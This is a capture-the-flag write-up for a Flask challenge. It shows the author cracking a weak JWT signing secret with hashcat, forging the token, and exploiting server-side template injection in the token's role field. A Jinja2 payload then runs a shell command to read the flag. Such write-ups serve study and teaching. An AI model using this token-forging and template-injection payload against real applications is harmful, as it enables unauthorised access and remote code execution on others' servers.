# Drink From My Flask

![](2023-05-14-12-34-57.png)

We are given a website without source code that seemingly has very little functionality.

Looking at my cookies, I find a JWT with the following data:

```
{"typ":"JWT","alg":"HS256"}{"role":"guest"}
```

The `alg` field indicates that it is encrypted using a secret key. I can crack the secret key using hashcat:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww:key

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3..._SRUww
Time.Started.....: Fri May 12 20:08:53 2023 (1 sec)
Time.Estimated...: Fri May 12 20:08:54 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   599.6 kH/s (2.67ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 897024/14344385 (6.25%)
Rejected.........: 0/897024 (0.00%)
Restore.Point....: 894976/14344385 (6.24%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: kimhoe -> ketepasa
Hardware.Mon.#1..: Util: 73%
```

to find out that that the key is simply `key`. Using this I create a jwt with the username admin and set it as my cookie.

Upon accessing a random page on the website, I am told that only two pages exist, `/` and `/adminPage`.

Visint adminpage, I see this:

![](2023-05-14-12-38-04.png)

There was seemingly zero functionality on this webpage. I decided to try a few things and changed my username to `{{7*7}}`. I was greeted with a message that `49` is not an admin. This indicates that the server is vulnerable to SSTI through the `role` attribute of our JWT.

Using the following simple SSTI payload: I was able to get the flag:

```
{
    "role": "{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}"
}
```

Flag: `Hero{sst1_fl4v0ur3d_c0Ok1e}`
